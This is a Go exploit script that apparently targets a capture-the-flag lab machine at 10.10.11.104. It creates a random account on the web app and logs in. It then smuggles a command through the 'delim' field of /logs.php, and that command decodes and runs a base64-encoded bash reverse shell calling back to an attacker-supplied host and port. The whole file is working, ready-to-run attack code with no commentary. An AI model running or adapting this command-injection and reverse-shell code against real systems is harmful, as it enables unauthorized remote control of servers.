//usr/bin/env go run $0 $@; exit $?

package main

import (
	"bytes"
	"fmt"
	"os"
	"time"

	"encoding/base64"
	"math/rand"
	"net/http"
)

const CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

var BASE_URL = "http://10.10.11.104"

var httpClient = &http.Client{
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
	Timeout: time.Second,
}

func init() {
	if len(os.Args) == 1 {
		fmt.Println("Usage: go run foothold.go <lhost> <lport>")
		os.Exit(1)
	}

	rand.Seed(time.Now().UnixNano())
}

func randString(n int) string {
	bytes := make([]byte, n)

	for i := range bytes {
		bytes[i] = CHARS[rand.Intn(len(CHARS))]
	}

	return string(bytes)
}

func doPost(dir, data, cookie string) string {
	req, _ := http.NewRequest("POST", BASE_URL+dir, bytes.NewBufferString(data))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	if cookie != "" {
		req.Header.Set("Cookie", cookie)
	}

	res, err := httpClient.Do(req)

	if err != nil || len(res.Header["Set-Cookie"]) == 0 {
		return ""
	}

	return res.Header["Set-Cookie"][0]
}

func register(username, password string) string {
	data := fmt.Sprintf("username=%[1]s&password=%[2]s&confirm=%[2]s", username, password)
	return doPost("/accounts.php", data, "")
}

func login(username, password string) string {
	data := fmt.Sprintf("username=%s&password=%s", username, password)
	return doPost("/login.php", data, "")
}

func formatRevShell(lhost, lport string) string {
	payload := fmt.Sprintf("bash  -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

func sendRevShell(cookie, lhost, lport string) {
	data := fmt.Sprintf("delim=tab; echo %s | base64 -d | bash", formatRevShell(lhost, lport))
	doPost("/logs.php", data, cookie)
}

func main() {
	lhost, lport := os.Args[1], os.Args[2]
	username, password := randString(10), randString(10)
	fmt.Printf("[+] Creating username: '%s', with password: '%s'\n", username, password)

	register(username, password)
	fmt.Println("[*] Registration successful")

	cookie := login(username, password)
	fmt.Println("[*] Login successful. Cookie:", cookie)

	sendRevShell(cookie, lhost, lport)
	fmt.Println("[!] Sent reverse shell. Check your nc listener")
}
